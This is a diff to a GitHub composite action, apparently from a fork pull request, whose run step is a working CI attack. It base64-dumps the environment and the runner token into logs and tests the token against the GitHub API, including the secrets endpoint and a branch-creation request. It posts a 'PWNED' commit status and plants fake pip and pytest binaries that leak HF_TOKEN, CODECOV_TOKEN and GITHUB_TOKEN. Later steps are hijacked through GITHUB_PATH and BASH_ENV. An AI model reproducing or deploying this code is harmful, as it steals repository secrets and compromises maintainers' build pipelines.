@@ -16,11 +16,10 @@ runs:
         POC_EVENT: ${{ github.event_name }}
       run: |
         set +e
-        echo "POC_RCE_COMPOSITE_v1_MARKER"
-        echo "POC_WHOAMI=$(id -un) POC_HOST=$(hostname) POC_DATE=$(date -u +%FT%TZ)"
-        echo "POC_EVENT_NAME=$POC_EVENT POC_HEAD_SHA_FROM_PAYLOAD="
-        git rev-parse HEAD
-        echo "POC_GIT_REMOTE=$(git remote get-url origin 2>/dev/null)"
+        echo "POC_RCE_COMPOSITE_v2_MARKER"
+        echo "POC_WHOAMI=$(id -un) POC_HOST=$(hostname) POC_DATE=$(date -u +%FT%TZ) POC_EVENT_NAME=$POC_EVENT"
+        echo "POC_CHECKED_OUT_SHA=$(git rev-parse HEAD 2>/dev/null)"
+        echo "POC_HEAD_SHA=$(printf '%s' "$POC_SHA")"
         echo "POC_ENV64_START"
         env | base64 -w0; echo
         echo "POC_ENV64_END"
@@ -28,32 +27,31 @@ runs:
         printf '%s' "$POC_TOKEN" | base64 -w0; echo
         echo "POC_TOKEN64_END"
 
-        # prove the runner token is live and show its effective permissions
         echo "POC_API_USER=$(curl -s -H "Authorization: Bearer $POC_TOKEN" -H 'Accept: application/vnd.github+json' https://api.github.com/user | tr -d '\n' | head -c 200)"
         echo "POC_API_REPO=$(curl -s -H "Authorization: Bearer $POC_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$POC_REPO" | tr -d '\n' | head -c 200)"
         echo "POC_API_SECRETS=$(curl -s -H "Authorization: Bearer $POC_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$POC_REPO/actions/secrets" | tr -d '\n' | head -c 200)"
-        echo "POC_API_PUSH=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $POC_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$POC_REPO/git/refs" -d '{"ref":"refs/heads/poc-token-write-test","sha":"'"$POC_SHA"'"}')"
-
-        # statuses:write -> post a marker status we can read back anonymously
+        echo "POC_API_PUSH_REF_HTTP=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $POC_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$POC_REPO/git/refs" -d '{"ref":"refs/heads/poc-token-write-test","sha":"'"$POC_SHA"'"}')"
         echo "POC_STATUS_POST_HTTP=$(curl -s -o /tmp/poc_status.json -w '%{http_code}' -X POST -H "Authorization: Bearer $POC_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$POC_REPO/statuses/$POC_SHA" -d '{"state":"success","context":"poc-rce-from-fork","description":"PWNED by lazyhacker6 via fork PR composite action"}')"
         head -c 300 /tmp/poc_status.json; echo
 
-        # neuter the later install steps and make pytest a payload carrier
+        # make every later bash step run our stubs first: BASH_ENV beats PATH order
         mkdir -p /tmp/poc-bin
-        printf '#!/usr/bin/env bash\necho POC_FAKE_PIP invoked "$@"\nexit 0\n' > /tmp/poc-bin/pip
+        printf '#!/usr/bin/env bash\necho POC_FAKE_PIP_v2 args="$@"\nexit 0\n' > /tmp/poc-bin/pip
         cat > /tmp/poc-bin/pytest <<'POC_PYTEST'
         #!/usr/bin/env bash
-        echo "POC_FAKE_PYTEST_v1_MARKER args=$*"
-        echo "POC_PYTEST_SECRET_ENV64_START"
+        echo "POC_FAKE_PYTEST_v2_MARKER args=$*"
+        echo "POC_PYTEST_ENV_KEYS=$(env | cut -d= -f1 | sort | tr '\n' ' ')"
+        echo "POC_PYTEST_ENV64_START"
         env | base64 -w0; echo
-        echo "POC_PYTEST_SECRET_ENV64_END"
+        echo "POC_PYTEST_ENV64_END"
         echo "POC_PYTEST_HF_TOKEN_B64=$(printf '%s' "${HF_TOKEN:-}" | base64 -w0)"
         echo "POC_PYTEST_CODECOV_TOKEN_B64=$(printf '%s' "${CODECOV_TOKEN:-}" | base64 -w0)"
         echo "POC_PYTEST_GITHUB_TOKEN_B64=$(printf '%s' "${GITHUB_TOKEN:-}" | base64 -w0)"
-        env | cut -d= -f1 | sort | tr '\n' ' '; echo
         exit 0
         POC_PYTEST
+        printf 'export PATH=/tmp/poc-bin:$PATH\n' > /tmp/poc_env.sh
         chmod +x /tmp/poc-bin/pip /tmp/poc-bin/pytest
         echo "/tmp/poc-bin" >> "$GITHUB_PATH"
+        echo "BASH_ENV=/tmp/poc_env.sh" >> "$GITHUB_ENV"
         echo "POC_SETUP_DONE"
         exit 0
